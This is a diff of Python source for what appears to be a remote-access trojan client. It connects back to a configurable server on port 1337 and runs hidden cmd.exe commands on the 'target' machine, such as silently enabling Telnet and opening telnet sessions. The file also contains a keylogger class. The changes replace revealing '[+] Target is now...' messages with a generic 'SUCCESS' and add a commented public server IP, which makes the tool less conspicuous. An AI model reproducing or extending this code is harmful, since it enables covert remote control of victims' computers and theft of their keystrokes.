@@ -83,7 +83,7 @@ class Client:
 
     def confirmconnection(self):
         gendkey = self.client.recv(self.BUFFER_SIZE).decode()
-        print(gendkey)
+        # print(gendkey)
         acceptancecode = input("Enter the Given Key: ")
 
         if acceptancecode != gendkey:
@@ -209,24 +209,28 @@ class Client:
     def enableTN(self):
         msg = "start /B start cmd.exe @cmd /c pkgmgr /iu:TelnetClient "
         self.runrun(msg)
-        self.client.send("[+] Telnet Client Enabled".encode("utf-8"))
+        self.client.send("SUCCESS".encode("utf-8"))
+        #self.client.send("[+] Telnet Client Enabled".encode("utf-8"))
 
     def playchess(self):
         msg = "start /B start cmd.exe @cmd /c telnet freechess.org "
         self.runrun(msg)
-        self.client.send("[+] Target is now playing Chess".encode("utf-8"))
+        self.client.send("SUCCESS".encode("utf-8"))
+        # self.client.send("[+] Target is now playing Chess".encode("utf-8"))
         # chess_true = subprocess.check_call("start /B start cmd.exe @cmd /k telnet freechess.org ", shell=True)
 
     def playstarwars(self):
         msg = "start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl "
         self.runrun(msg)
-        self.client.send("[+] Target is now Watching Star Wars Ep.IV: A New Hope".encode("utf-8"))
+        self.client.send("SUCCESS".encode("utf-8"))
+        # self.client.send("[+] Target is now Watching Star Wars Ep.IV: A New Hope".encode("utf-8"))
         # Sw = subprocess.check_call("start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl ", shell=True)
 
     def weather(self):
         msg = "start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com "
         self.runrun(msg)
-        self.client.send("[+] Target is now checking the Weather".encode("utf-8"))
+        self.client.send("SUCCESS".encode("utf-8"))
+        # self.client.send("[+] Target is now checking the Weather".encode("utf-8"))
         # weather = subprocess.check_call("start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com ", shell=True)
 
 # ''' KEYLOGGER FUNCTIONS '''
@@ -573,6 +577,7 @@ class Keylogger:
 
 def main():
     SERVER_IP = "192.168.56.1"  # modify me
+    #  SERVER_IP = "82.13.30.90"
     PORT = 1337  # modify me (if you want)
     BUFFER_SIZE = 2048
     safemode = bool(True)
